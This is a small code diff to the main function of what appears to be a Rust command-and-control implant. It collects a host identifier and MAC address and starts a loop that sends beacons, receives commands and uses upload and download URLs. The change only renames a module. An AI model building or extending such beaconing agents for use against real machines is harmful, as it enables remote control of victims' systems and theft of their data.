@@ -13,5 +13,5 @@ async fn main() {
     let (uuid, mac_addr) = sysinfo::saver::save_file().expect("Error saving file");
 
     // Run the main loop to send beacons and receive commands
-    beacon::sender::run(uuid, mac_addr, BEACON_URL, UPLOAD_URL, DOWNLOAD_URL).await;
+    beacon::beacon::run(uuid, mac_addr, BEACON_URL, UPLOAD_URL, DOWNLOAD_URL).await;
 }
